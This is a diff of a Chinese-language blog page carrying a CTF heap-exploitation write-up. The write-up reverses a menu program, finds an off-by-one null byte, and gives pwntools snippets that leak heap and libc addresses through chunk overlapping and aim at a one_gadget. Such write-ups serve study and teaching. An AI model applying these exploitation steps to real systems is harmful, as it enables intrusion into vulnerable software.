@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,47 +263,31 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-lTbVMxLO" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
-
+    <div id="aplayer-hkHuicPS" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div>
 <h1><span id="overview">overview</span></h1><p>​        蛮好，好久没有做到全绿的题了。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%882.04.22.png" alt="截屏2022-05-15 下午2.04.22"></p>
 <p>​        程序还是菜单，增删查三个功能，并不是特别友好。</p>
 <h1><span id="reverse">reverse</span></h1><h2><span id="mem_init">mem_init</span></h2><p>​        初始化了一个随机地址的0x1000的空间，并把它的指针存放在bss段上。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v2 &lt;= <span class="number">0x10000</span> )</span><br><span class="line">    v2 = rand() &amp; <span class="number">0xFFFFF000</span>;</span><br><span class="line">  unk_202018 = mmap((<span class="keyword">void</span> *)v2, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  result = unk_202018;</span><br></pre></td></tr></table></figure>
-
 <h2><span id="add">add</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allocate(head + <span class="number">48LL</span> * i, size);</span><br></pre></td></tr></table></figure>
-
 <p>跟进allocate函数：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*a1 = a2;                                     <span class="comment">// first filed =&gt; size</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name of heart :&quot;</span>);</span><br><span class="line">read_str(a1 + <span class="number">1</span>, <span class="number">32LL</span>);                       <span class="comment">// second filed =&gt; name</span></span><br><span class="line">a1[<span class="number">5</span>] = <span class="built_in">malloc</span>(a2);</span><br></pre></td></tr></table></figure>
-
-
-
 <p>这里的<code>read_str</code>:</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(buf + str_len - <span class="number">1</span>) == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    *(buf + str_len - <span class="number">1</span>) = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​        判断结尾的时候-1，比如说如果我输入了20个字符，第19个是换行，那么19就会被置0，但是20还是不会变化，然后返回20这个数。</p>
 <p>​        接着是：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;secret of my heart :&quot;</span>);</span><br><span class="line">  result = (a1[<span class="number">5</span>] + read_str(a1[<span class="number">5</span>], a2));       <span class="comment">// input in the head + 40 ,then put the last byte to 0</span></span><br><span class="line">  *result = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
-
 <p>​        这样这个*result的最后就有两个空字节了。</p>
 <h2><span id="show">show</span></h2><p>​        就是打印对应的字符串。目前咩有什么好分析的，</p>
 <h2><span id="free">free</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*buf = <span class="number">0LL</span>;<span class="comment">//free heap</span></span><br><span class="line"><span class="built_in">memset</span>((buf + <span class="number">8</span>), <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line"><span class="built_in">free</span>(*(buf + <span class="number">40</span>));<span class="comment">//free secret</span></span><br><span class="line">result = buf;</span><br><span class="line">*(buf + <span class="number">40</span>) = <span class="number">0LL</span>;<span class="comment">//set 0 to secret</span></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
-
 <p>​        非常认真地置0了很多东西。应该没有uaf了。</p>
 <h2><span id="secret">secret</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Your secret : %p\n&quot;</span>, head);</span><br><span class="line"> <span class="built_in">puts</span>(<span class="string">&quot;Good bye ~&quot;</span>);</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
-
 <p>一个bss的leak。看似赚了，实则赔钱。估计是可以打exit hook。</p>
 <h1><span id="利用">利用</span></h1><p>​        还是没有什么很成型的思路，先动调一下。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure>
-
-
-
 <h2><span id="第一个疑点没用">第一个疑点（没用</span></h2><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%888.34.11.png" alt="截屏2022-05-15 下午8.34.11"></p>
 <p>​        </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x18,b&#x27;a&#x27;*0x20,b&#x27;a&#x27;*0x18)</span><br></pre></td></tr></table></figure>
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%888.34.48.png" alt="截屏2022-05-15 下午8.34.48"></p>
 <p>​        </p>
 <p>​        这里name大于或者等于size，就会清空secret。然后将name的东西覆盖到secret的空间。比如说</p>
@@ -320,16 +304,12 @@
 <p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%889.15.52.png" alt="截屏2022-05-15 下午9.15.52"></p>
 <p>​        好东西。但是不是重点。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;qwq&#x27;</span>+<span class="string">b&#x27;a&#x27;</span> *<span class="number">26</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name :&quot;</span>)</span><br><span class="line">data = p.recv()[<span class="number">33</span>:<span class="number">39</span>]</span><br><span class="line">heap_base = u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;heap_base:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
-
 <p>​        哎，稳定leak heap，如果这个题没有限制size就可以用mmap leak libc了。</p>
 <h2><span id="off-by-one和一些废话">off by one（和一些废话）</span></h2><p>​    继续研究。第一个疑点的稳定利用方式还是没有找到，我感觉这里是有单字节溢出，但是怎么都找不到利用方式。</p>
 <p>​        我是个如假包换的傻逼，我终于知道这个问题在哪里了。我在add函数写发送name和secret的时候全部在前面加了一个str（），导致gdb显示的东西乱七八糟混淆视听了。</p>
 <p>​        这样看之前那个疑点其实并不是疑点，只是一个程序的feature。</p>
 <p>​        真正的off by one其实是在secret。这里确实是我傻逼了，我直接傻愣愣地连续申请三个chunk，怎么可能看得出来off by one？直接free中间的一个chunk，然后再申请回来自然就有了，还是同类题做得太太太少了。大概像这样：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;qwq&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">29</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;qaq&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​            这样就可以溢出到下一个chunk：</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.16.46.png" alt="截屏2022-05-15 下午11.16.46"></p>
 <p>​        然后就是需要利用到off by one来构造uaf。</p>
@@ -337,14 +317,11 @@
 <p>​        所以如何构造呢？</p>
 <h2><span id="off-by-one构造double-free">off by one构造double free</span></h2><p>​        蛮久没有做off by one的题了，先大致回想一下。        </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;qwq&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">29</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment">#add(0x68,b&#x27;qaq&#x27;,b&#x27;c&#x27;*0x18)</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaa&#x27;</span>,payload)</span><br></pre></td></tr></table></figure>
-
 <p>​        这里，这个用来被溢出的chunk的size，因为只能溢出一个空字节，所以低位会被置为00，所以这里size肯定得是三位数，所以这样一看比较方便的就是0xf8，正好对应它的free 时的size位0x100.</p>
-<img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.26.48.png" alt="截屏2022-05-15 下午11.26.48" style="zoom:50%;">
-
+<p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.26.48.png" alt="截屏2022-05-15 下午11.26.48" style="zoom:50%;"></p>
 <p>​        </p>
 <p>​        所以这里我们就伪造了一个free chunk，如果再将其free掉就能收获一个快乐的libc leak。然而事实没有那么如意，这里存在一定的检测，如果是像我测试时那样呆呆地将上一个chunk的fd和bl全部置为a的话，这里铁定会报错。        </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload = p64(heap_base) * <span class="number">2</span> + p64(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaa&#x27;</span>,payload)<span class="comment">#chunk3</span></span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Secret :&quot;</span>)</span><br><span class="line">data = p.recv()[<span class="number">1</span>:<span class="number">7</span>]</span><br><span class="line">libc_base = u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span> - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + one_gadget_offset[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
-
 <p>​        这样也就确实可以leak libc了。        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-05-15%20%E4%B8%8B%E5%8D%8811.59.35.png" alt="截屏2022-05-15 下午11.59.35"></p>
 <p>​        </p>
 <p>​        这里其实是利用到一个chunk overlapping的向前合并的原理。</p>
